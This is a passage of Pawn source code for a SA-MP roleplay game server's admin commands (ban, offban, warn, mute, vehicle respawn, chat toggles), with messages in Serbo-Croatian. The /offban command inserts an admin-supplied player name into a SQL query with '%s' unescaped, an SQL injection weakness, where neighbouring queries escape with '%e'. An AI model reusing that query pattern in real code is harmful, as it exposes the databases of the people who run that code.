		AdminMsg( ADM_WARN, "[ADMIN] %s je dobi%s ban od Admina %s, razlog: %s, ban istice za %d dana.", ImeIgraca( id ), getPolForString(id, "o", "la"), ImeIgraca( playerid ), razlog, ban_days );

	    PlayerInfo[ playerid ][ xAGMStats ]++;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );
	    ServerInfo[ BanovanihKorisnika ]++;

		new datetime[ 6 ];
        TimestampToDate( gettime()+(86400*ban_days), datetime[ 0 ], datetime[ 1 ], datetime[ 2 ], datetime[ 3 ], datetime[ 4 ], datetime[ 5 ], 1 );

        for(new i; i < 15; i++) SendClientMessage(playerid, -1, " ");
		SCMF( id, -1, ">> Dobi%s si privremeni ban sa ovog servera.", getPolForString(id, "o", "la") );
		SCMF( id, -1, ">> Vas ban istice: {4282C0}%02d/%02d/%d - %d/%d/%d",  datetime[ 2 ], datetime[ 1 ], datetime[ 0 ], datetime[ 3 ], datetime[ 4 ], datetime[ 5 ] );
		SCMF( id, -1, ">> Razlog bana: {4282C0}%s", razlog );
		SCMF( id, -1, ">> Admin koji vas je banovao: {4282C0}%s", ImeIgraca( playerid ) );
		SendClientMessage( id, -1, ">> Ukoliko mislis da je ovo greska.");
		SendClientMessage( id, -1, ">> Zahtev za unban mozes traziti na {4282C0}forumu.");
		SendClientMessage( id, -1, ">> Forum: {4282C0}"SERVER_WEB"");

	    Kickovanje( id, "Ti si banovan sa servera. Unban zatrazi na forumu: {FF0000}"SERVER_WEB"");
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:ban( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1)
	{
		new id, razlog[ 40 ];
	    if( sscanf( params, "us[40]", id, razlog ) ) return SendUsageMessage( playerid, "/ban [ ID/Deo Imena ] [ Razlog ]");
	    if( !IsPlayerConnected( id ) ) return SendErrorMessage( playerid, "Pogresan ID.");
	    if( PlayerInfo[ playerid ][ xAdmin ] < 5 && (PlayerInfo[ id ][ xAdmin ] > 0 || PlayerInfo[ playerid ][ xSpecAdmin ] > 0) ) return SendErrorMessage( playerid, "Ne mozete banovati druge clanove Admin tima.");
	    if(IsSpecialUser(id)) return SendErrorMessage(playerid, "Glavne ne mores ban.");
		if( PlayerInfo[playerid][xAdmin] < PlayerInfo[id][xAdmin] ) return SendErrorMessage( playerid, "Ne mozes to jacima od sebe");
		if( PlayerInfo[playerid][xAdmin] != 0 && PlayerInfo[id][xAdmin] != 0) return SendErrorMessage( playerid, "Ne mozete se medusobno banovati");
 
		AdminMsg( ADM_WARN, "[ADMIN] %s je dobi%s ban od Admina %s, razlog: %s", ImeIgraca( id ), getPolForString(id, "o", "la"), ImeIgraca( playerid ), razlog );

	    PlayerInfo[ playerid ][ xAGMStats ]++;
        sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

        ServerInfo[ BanovanihKorisnika ]++;

		SendClientMessageToAllEx( 0xFF4500FF, "#BAN: {FFFFFF}%s {FF4500}je banova%s sa servera. | Razlog: {FFFFFF}%s", ImeIgraca( id ), getPolForString(id, "n", "na"), razlog );

        new year, month, day;
		getdate( year, month, day );

		new playersip[22];
        GetPlayerIp( id, playersip, sizeof( playersip ) );

        for(new i; i < 15; i++) SendClientMessage( id, -1, " ");
		SCMF( id, 0xF0F8FFAA, "Banovani ste sa ovog servera od strane {FFFFFF}%sa %s.", getAdminRankName(playerid), ImeIgraca( playerid ) );
		SCMF( id, 0xF0F8FFAA, "Razlog iskljucenja: {FFFFFF}%s", razlog);
		SCMF( id, 0xF0F8FFAA, "Datum bana: {FFFFFF}%d-%d-%d {F0F8FF}| Vas IP: {FFFFFF}%s", month, day, year, playersip );
   		SendClientMessage( id, 0xF0F8FFAA, "Sa ovim banom, vas korisnicki racun je suspendiran na {FFFFFF}neodredjeno.");
		SendClientMessage( id, 0xF0F8FFAA, "Ukoliko mislis da je doslo do greske slikaj ovo(F8) i {FFFFFF}zatrazi unban {F0F8FF}na forumu.");

		SCMF( playerid, 0xFF6347AA, "IP banovanog igraca: {FFFFFF}%s {FF6347}| Adresa sa banom {FFFFFF}nije banovana.", playersip );
		SendClientMessage( playerid, 0xF0F8FFAA, "Ukoliko zelis banovati i IP, pisi {FFFFFF}[ /banip (ip koji pise iznad ove poruke) ].");

		sql_ban_user( ImeIgraca( id ), PlayerInfo[ id ][ xID ], 1, razlog, ImeIgraca( playerid ) );
		WriteLog("log-ban", "Admin %s je banovao igraca %s | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), razlog);
	    Kickovanje( id, "Ti si banovan sa servera. Unban zatrazi na forumu: {FF0000}"SERVER_WEB"" );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:offban( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		new imeigraca[ 24 ], razlog[ 40 ];
		if( sscanf( params, "s[24]s[40]", imeigraca, razlog ) ) return SendUsageMessage( playerid, "/offban [Ime_Prezime] [razlog]" );
		if( PlayerInfo[playerid][xAdmin] < PlayerInfo[GetPlayerIdFromName( imeigraca )][xAdmin] ) return SendErrorMessage( playerid, "Ne mozes to jacima od sebe");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) return SendErrorMessage( playerid, "Taj igrac je online tako da banuj ga online.");

		new query[60 + MAX_PLAYER_NAME];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%s'", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffBan", "sis", razlog, playerid, imeigraca );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unban( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 )
	{
		new imeigraca[ MAX_PLAYER_NAME ];
		if( sscanf( params, "s[24]", imeigraca ) ) return SendUsageMessage( playerid, "/unban [Ime_Prezime]");

        new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `banned` WHERE `user_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerUnBan", "is", playerid, imeigraca );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:warn( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1  )
	{
		new id, reason[ 48 ];
		if( sscanf( params, "rs[48]", id, reason ) ) return SendUsageMessage( playerid, "/warn [id] [razlog]");
		if( !IsPlayerConnected( id ) ) return SendErrorMessage( playerid, "Pogresan ID.");
		if(PlayerInfo[id][xWarn] >= 5) return SendErrorMessage(playerid, "Vec ima 5/5.");

		PlayerInfo[ id ][ xWarn ] += 1;
		sql_user_update_integer( id, "warn", PlayerInfo[ id ][ xWarn ] );
		PlayerInfo[ playerid ][ xAGMStats ]++;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

		SendInfoMessage( id, "Admin %s vam je da%s warn(%d/5). Razlog: %s", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), PlayerInfo[ id ][ xWarn ], reason );
		SendInfoMessage( playerid, "Dali ste warn igracu %s. Razlog: %s", ImeIgraca( id ), reason );
 
		AdminMsg( ADM_WARN, "[ADMIN] %s je dao warn igracu %s. Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), reason );

        WriteLog("log-punishment", "Admin %s je dao warn igracu %s | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), reason);

        ServerInfo[ BrojWarnova ]++;

		if( PlayerInfo[ id ][ xWarn ] >= 5 )
		{ 
			AdminMsg( ADM_WARN, "[ADMIN] %s je dobi%s ban od Admina %s, razlog: 5/5 upozorenja.", ImeIgraca( id ), getPolForString(id, "o", "la"), ImeIgraca( playerid ) );

		    sql_ban_user( ImeIgraca( id ), PlayerInfo[ id ][ xID ], 1, "Warn 5/5", ImeIgraca( playerid ));

            ServerInfo[ BanovanihKorisnika ]++;

	        Kickovanje( id, "Ti si banovan sa servera. Unban zatrazi na forumu: {FF0000}"SERVER_WEB"");
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unwarn( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 )
	{
		new id;
		if( sscanf(params, "u", id ) ) return SendUsageMessage( playerid, "/unwarn [id]");
		if( !IsPlayerConnected( id ) ) return SendErrorMessage( playerid, "Pogresan ID." );
		if( PlayerInfo[ id ][ xWarn ] == 0 ) return SendErrorMessage( playerid, "Igrac nema warnova koje bi skinuli." );

		SendInfoMessage( playerid, "Skinuli ste warn igracu {FFFFFF}%s {4282C0}| Warn: {FFFFFF}(%d/5)", ImeIgraca( id ), PlayerInfo[ id ][ xWarn ] );
		SendInfoMessage( id, "Admin {FFFFFF}%s {4282C0}vam je skinu%s warn | Warn: {FFFFFF}(%d/5)", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), PlayerInfo[ id ][ xWarn ] );
 
		AdminMsg( ADM_WARN, "[ADMIN] %s je skinu%s warn igracu %s!", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );

		PlayerInfo[ playerid ][ xAGMStats ]++;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );
		ServerInfo[ BrojWarnova ]--;

		PlayerInfo[ id ][ xWarn ] -= 1;
		sql_user_update_integer( id, "warn", PlayerInfo[ id ][ xWarn ] );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:rac( playerid )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    //if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

	ShowPlayerDialog( playerid, dialog_RESETIRAJ, DIALOG_STYLE_LIST, D_NASLOV,
																				"{4282C0}(1). {FFFFFF}Privatna vozila\n\
																				{4282C0}(2). {FFFFFF}Organizacijska vozila\n\
																				{4282C0}(3). {FFFFFF}Sva vozila\n\
																				{4282C0}(4). {FFFFFF}Cisterne", "Potvrdi", "Odustani" );
	return 1;
}

CMD:rtcveh( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xVIPLevel ] >= 1 || PlayerInfo[ playerid ][ xPromoter ] >= 1 )
	{
		new car;
		if( sscanf( params, "d", car ) ) return SendUsageMessage( playerid, "/rtcveh [car id]");

		if( car != IVI )
		{
			if( PlayerInfo[ playerid ][ xVIPLevel ] >= 1 || PlayerInfo[ playerid ] [xPromoter] >= 2 && PlayerInfo[ playerid ][ xAdmin ] == 0 )
			{
	            if( ProcesSvercanja[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok svercas." );
			    if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok si na CS:DM." );
			    if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok si na trci." );
			    if( PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
			    if( UzeoOpremu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok radis posao ili imas uniformu posla." );
				if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok imas wanted level." );
				if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok si u jailu." );
	            if( PljackaUToku || ZlataraUToku ) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok je pljacka u toku." );
	            if( GetPlayerInterior( playerid ) > 0 ) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok si u interijeru.");

	            new slot = -1;
				for( new j = 0; j < MAX_VEH_SLOT; j ++ )
				{
					if( player_veh[ playerid ][ vehicle_id ][ j ] != -1 && player_veh[ playerid ][ vehicle_id ][ j ] == car )
					{
						slot = j;
						break;
					}
				}
				if( slot == -1 )
				{
					if( PlayerInfo[ playerid ][ xRezervniKljucevi ] == VehicleInfo[ car ][ vSqlID ] ) { }
					else return SendErrorMessage( playerid, "Mozete samo vase vozilo ili vozilo cije imate kljuceve." );
			  	}
			}
 
			DodajWarnRed("~y~(RTC) %s ~w~je respawna%s vozilo ~y~ID %d.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), car );
			VehicleObjectCheck( car );
		    SetVehicleToRespawn( car );
		    LinkVehicleToInterior( car, 0 );
			//RemovePlayerFromVehicle( playerid );

		    SendClientMessage( playerid, ZUTA, "(VOZILO): Uspesno respawnano vozilo na prvobitni polozaj.");
		}
		else return SendErrorMessage( playerid, "Pogresan id vozila." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:rtc( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 1 || PlayerInfo[ playerid ][ xVIPLevel ] >= 1 || PlayerInfo[ playerid ][ xPromoter ] >=1 )
	{
	    new car = GetPlayerVehicleID( playerid );
	    if( IsPlayerInAnyVehicle( playerid ) )
		{
	        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 1 || PlayerInfo[ playerid ][ xPromoter ] >= 2 && PlayerInfo[ playerid ][ xAdmin ] == 0 )
			{
	            if( ProcesSvercanja[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok svercas." );
			    if( NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok si na CS:DM." );
			    if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok si na trci." );
			    if( PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
			    if( UzeoOpremu[ playerid ]) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok radis posao ili imas uniformu posla." );
				if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok imas wanted level." );
				if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok si u jailu." );
	            if( PljackaUToku || ZlataraUToku ) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok je pljacka u toku." );
	            if( GetPlayerInterior( playerid ) > 0 ) return SendErrorMessage( playerid, "Ne mozes rtc vozilo dok si u interijeru.");

	            new slot = -1;
				for( new j = 0; j < MAX_VEH_SLOT; j ++ )
				{
					if( player_veh[ playerid ][ vehicle_id ][ j ] != -1 && player_veh[ playerid ][ vehicle_id ][ j ] == car )
					{
						slot = j;
						break;
					}
				}
				if( slot == -1 )
				{
					if( PlayerInfo[ playerid ][ xRezervniKljucevi ] == VehicleInfo[ car ][ vSqlID ] ) { }
					else return SendErrorMessage( playerid, "Mozete samo vase vozilo ili vozilo cije imate kljuceve." );
			  	}
			}
 
			DodajWarnRed("~y~(RTC) %s ~w~je respawna%s vozilo ~y~ID %d.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), car );

			VehicleObjectCheck( car );
		    SetVehicleToRespawn( car );
		    LinkVehicleToInterior( car, 0 );
			RemovePlayerFromVehicle( playerid );

		    SendClientMessage( playerid, ZUTA, "(VOZILO): Uspesno respawnano vozilo na prvobitni polozaj.");
	   	}
	   	else return SendErrorMessage( playerid, "Morate biti u vozilu. " );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:nick( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
        //if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );
		new id;
	    if( sscanf( params, "r", id ) ) return SendUsageMessage( playerid, "/nick [id/name]");
        if( id == IPI ) return SendUsageMessage( playerid, "Pogresan ID igraca." );

		SendClientMessage( id, 0x33AA33AA, "_________________________ (ULTIMATE ADMIN OBAVIJEST) _________________________");
	    SendClientMessage( id, ZUTA, "** Server upozorenje: koristis pogresan nick.");
	    SendClientMessage( id, ZUTA, "> Nick se mora sastojati od imena i prezimena.");
	    SendClientMessage( id, ZUTA, "> Koristi ovakav oblik: Ime_Prezime, prva velika slova(Primjer: Marko_Markovic).");
	    SendClientMessage( id, ZUTA, "> Nick ne smije imati brojke i takodjer mora imati crticu izmedju ime i prezime.");
 
		DodajWarnRed("~r~(NICK) %s ~w~je kickova%s zbog nepravilnog imena od strane ~r~%s", ImeIgraca( id ), getPolForString(id, "n", "na"), ImeIgraca( playerid ) );

		Kickovanje(id, "Admin: {FF0000}%s {FFFFFF}| Razlog: {FF0000}NON-RP Nick", ImeIgraca( playerid ));
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:ukloniradio( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 )
	{
		if( Boombox_Nearest( playerid ) == IPI ) return SendErrorMessage( playerid, "Niste pored radia." );

		Boombox_Destroy( Boombox_Nearest( playerid ) );
		SendInfoMessage( playerid, "Sklonili ste radio sa zemlje." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:skloniblokade( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 )
	{
		DeleteClosestRoadblock( playerid );
		SendInfoMessage( playerid, "Sklonili ste blokade policije u vasoj okolini." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:disarm( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 )
	{
        //if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );
		new id;
	    if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/disarm [id]");

	    if( id != IPI && PlayerLogged[ id ] != false)
		{
		    SendInfoMessage( id, "Admin {FFFFFF}%s {4282C0}ti je oduze%s oruzje.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
			SendInfoMessage( playerid, "Oduze%s si oruzje igracu {FFFFFF}%s.", getPolForString(playerid, "o", "la"), ImeIgraca( id ) );
			ResetPlayerWeapons( id );
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:mute( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 )
	{
        //if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

		new id, vreme, razlog[ 40 ];
	    if( sscanf( params, "uds[40]", id, vreme, razlog ) ) return SendUsageMessage( playerid, "/mute [id/ime] [vreme] [razlog]");

		if( id != IPI && PlayerLogged[ id ] != false)
		{
			PlayerInfo[ id ][ xMute ] = gettime()+(vreme*60);
 
			AdminMsg( ADM_WARN, "[ADMIN] %s je usutka%s od strane %s", ImeIgraca( id ), getPolForString(id, "n", "na"), ImeIgraca( playerid ) );

			SendInfoMessage( playerid, "Usutkali ste igraca na {FFFFFF}%s {4282C0}minuta {FFFFFF}(%d).", ImeIgraca( id ), vreme );
			SendInfoMessage( id, "Admin %s vas je usutka%s na {FFFFFF}(%d) {4282C0}minuta. | Razlog: {FFFFFF}%s", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), vreme, razlog );

			WriteLog("log-punishment", "Admin %s je mute igraca %s | Razlog: %s", ImeIgraca( playerid ), ImeIgraca( id ), razlog);

			new q[128];
			mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `mute` = '%d' WHERE `user_id` = '%d'", PlayerInfo[id][xMute], PlayerInfo[id][xID]);
			mysql_tquery(mSQL, q);
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:offmute( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] >= 2  )
	{
		new vreme, razlog[40], imeigraca[ MAX_PLAYER_NAME ];
		if( sscanf( params, "s[24]is[40]", imeigraca, vreme, razlog ) )
		{
			SendUsageMessage( playerid, "/offmute [Ime_Prezime] [minuti] [razlog]");
			return 1;
	    }
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da izbaci ga online.");
			return 1;
		}
		if( vreme < 1 ) return SendErrorMessage( playerid, "Vreme za mute ne moze biti manje od 1 minut.");

        new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffJandP", "iisis", playerid, MUTE, imeigraca, (vreme*60), razlog );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:unmute( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 2 )
	{
		new id;
	    if( sscanf( params, "r", id ) ) return SendUsageMessage( playerid, "/unmute [id]");
		if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID korisnika." );
		if( gettime() >= PlayerInfo[id][xMute] ) return SendErrorMessage(playerid, "Taj igrac nije mutiran.");
	    PlayerInfo[ id ][ xMute ] = 0;
 
		AdminMsg( ADM_WARN, "[ADMIN] %s je odsutka%s od strane %s", ImeIgraca( id ), getPolForString(id, "n", "na"), ImeIgraca( playerid ) );

		SendInfoMessage( playerid, "Odsutkali ste igraca {FFFFFF}%s.", ImeIgraca( id ) );
		SendInfoMessage( id, "Admin {4282C0}%s {FFFFFF}vas je odsutka%s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );

		static q[70];
		mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `mute` = '0' WHERE `user_id` = '%d'", PlayerInfo[id][xID]);
		mysql_tquery(mSQL, q);
	}
	return 1;
}

CMD:tog(playerid, const params[])
{
	new vrsta[15];
	if(sscanf(params, "s[15]{s[144]}", vrsta))
	{
		SendUsageMessage(playerid, "/tog [vrsta]");
		SCMF(playerid, 0xCCCCCCFF, "VRSTA: %s | %s | %s | %s",
																	(gNews{ playerid } == 0) ? ("{00FF00}news{FFFFFF}") : ("{FF0000}news{FFFFFF}"),
																	(PhoneOnline[ playerid ] == 0) ? ("{00FF00}phone{FFFFFF}") : ("{FF0000}phone{FFFFFF}"),
																	(ToggedFR[playerid] == false) ? ("{00FF00}fr{FFFFFF}") : ("{FF0000}fr{FFFFFF}"),
																	(PlayerInfo[playerid][xTogLabel] == true) ? ("{00FF00}label{FFFFFF}") : ("{FF0000}label{FFFFFF}"));

		if(PlayerInfo[playerid][xAdmin] >= 3)
		{
			SCMF(playerid, 0xCCCCCCFF, "(A) VRSTA: %s | %s | %s | %s | %s | %s",
																			(ToggedG == true) ? ("{00FF00}g [chat]{FFFFFF}") : ("{FF0000}g [chat]{FFFFFF}"),
																			(ToggedN == true) ? ("{00FF00}n [chat]{FFFFFF}") : ("{FF0000}n [chat]{FFFFFF}"),
																			(ToggedL == true) ? ("{00FF00}l [chat]{FFFFFF}") : ("{FF0000}l [chat]{FFFFFF}"),
																			(ToggedPM[playerid] == false) ? ("{00FF00}sms{FFFFFF}") : ("{FF0000}sms{FFFFFF}"),
																			(ToggedWISP[playerid] == false) ? ("{00FF00}whisper{FFFFFF}") : ("{FF0000}whisper{FFFFFF}"),
																			(UKLJUCENIFCHAT[ playerid ] != -1) ? ("{00FF00}fchat{FFFFFF}") : ("{FF0000}fchat{FFFFFF}"),
																			(ToggedWeekend == true) ? ("{00FF00}weekendevents{FFFFFF}") : ("{FF0000}weekendevents{FFFFFF}"));
		}
		return 1;
	}
	if(strcmp(vrsta, "news", true) == 0)
	{
		if( !gNews{ playerid } )
		{
			gNews{ playerid } = 1;
			SendClientMessage( playerid, 0xBFC0C2FF, "(TOG): News chat kanal iskljucen.");
		}
		else if( gNews{ playerid } )
		{
			gNews{ playerid } = 0;
			SendClientMessage( playerid, 0xBFC0C2FF, "(TOG): News chat kanal ukljucen.");
		}
	}
	else if(strcmp(vrsta, "label", true) == 0)
	{
		if( PlayerInfo[playerid][xTogLabel] == true )
		{
			PlayerInfo[playerid][xTogLabel] = false;
			sql_user_update_integer(playerid, "xTogLabel", PlayerInfo[playerid][xTogLabel]);
			SendClientMessage( playerid, 0xBFC0C2FF, "(TOG): Ukljucili ste prikazivanje labela iznad glave (ukoliko ga imate).");
		}
		else
		{
			PlayerInfo[playerid][xTogLabel] = true;
			sql_user_update_integer(playerid, "xTogLabel", PlayerInfo[playerid][xTogLabel]);
			SendClientMessage( playerid, 0xBFC0C2FF, "(TOG): Iskljucili ste prikazivanje labela iznad glave (ukoliko ga imate).");
		}
	}
	else if(strcmp(vrsta, "g", true) == 0)
	{
		if( PlayerInfo[ playerid ][ xAdmin ] < 3 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

		if( ToggedG == true )
		{
			ToggedG = false;
			SendClientMessage( playerid, ZUTA, "(TOG): (/g) chat je iskljucen.");
	 
			AdminMsg( ADM_WARN, "[ADMIN] %s je ugasi%s G Chat.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
		else
		{
			ToggedG = true;
			SendClientMessage( playerid, ZUTA, "(TOG): (/g) chat je ukljucen.");
	 
			AdminMsg( ADM_WARN, "[ADMIN] %s je ukljuci%s G Chat.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
	}
	else if(strcmp(vrsta, "n", true) == 0)
	{
		if( PlayerInfo[ playerid ][ xAdmin ] < 3 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

		if( ToggedN == true )
		{
			ToggedN = false;
			SendClientMessage( playerid, ZUTA, "(TOG): (/n) chat je iskljucen.");
	 
			AdminMsg( ADM_WARN, "[ADMIN] %s je ugasi%s N Chat.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
		else
		{
			ToggedN = true;
			SendClientMessage( playerid, ZUTA, "(TOG): (/n) chat je ukljucen.");
	 
			AdminMsg( ADM_WARN, "[ADMIN] %s je ukljuci%s N Chat.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
	}

	else if(strcmp(vrsta, "l", true) == 0)
	{
		if( PlayerInfo[ playerid ][ xAdmin ] < 3 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

		if( ToggedL == true )
		{
			ToggedL = false;
			SendClientMessage( playerid, ZUTA, "(TOG): (/l) chat je iskljucen.");
	 
			AdminMsg( ADM_WARN, "[ADMIN] %s je ugasi%s L Chat.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
		else
		{
			ToggedL = true;
			SendClientMessage( playerid, ZUTA, "(TOG): (/l) chat je ukljucen.");
	 
			AdminMsg( ADM_WARN, "[ADMIN] %s je ukljuci%s L Chat.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
	}


	else if(strcmp(vrsta, "weekendevents", true) == 0)
	{
		if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

		if( ToggedWeekend == true )
		{
			ToggedWeekend = false;
			SendClientMessage( playerid, ZUTA, "(TOG): Eventi Weekend su iskljuceni.");
	 
			AdminMsg( ADM_WARN, "[ADMIN] %s je ugasi%s Event Weekend.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
		else
		{
			ToggedWeekend = true;
			SendClientMessage( playerid, ZUTA, "(TOG): Eventi Weekend su ukljucen.");
	 
			AdminMsg( ADM_WARN, "[ADMIN] %s je ukljuci%s Event Weekend.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		}
	}

	else if(strcmp(vrsta, "sms", true) == 0)
	{
		if( PlayerInfo[ playerid ][ xAdmin ] < 3 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

		if( !ToggedPM[playerid] )
		{
			ToggedPM[playerid] = true;
			SendClientMessage( playerid, ZUTA, "(TOG): (/sms) dostava/provjera/spijunaza iskljucena.");
		}
		else
		{
			ToggedPM[playerid] = false;
			SendClientMessage( playerid, ZUTA, "(TOG): (/sms) dostava/provjera/spijunaza ukljucena.");
		}
	}
	else if(strcmp(vrsta, "whisper", true) == 0)
	{
		if( PlayerInfo[ playerid ][ xAdmin ] < 3 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

		if(!ToggedWISP[playerid])
		{
			ToggedWISP[playerid] = true;
			SendClientMessage( playerid, ZUTA, "(TOG): (/w) dostava/provjera/spijunaza iskljucena.");
		}
		else
		{
			ToggedWISP[playerid] = false;
			SendClientMessage( playerid, ZUTA, "(TOG): (/w) dostava/provjera/spijunaza ukljucena.");
		}
	}
	else if(strcmp(vrsta, "phone", true) == 0)
	{
		if( PlayerInfo[ playerid ][ xBrojTelefona ] != 0 )
		{
			if( PhoneOnline[ playerid ] == 0 )
			{
				PhoneOnline[ playerid ] = 1;
				SendClientMessage( playerid, ZUTA, "(TOG): Iskljucio si mobilni telefon.");
			}
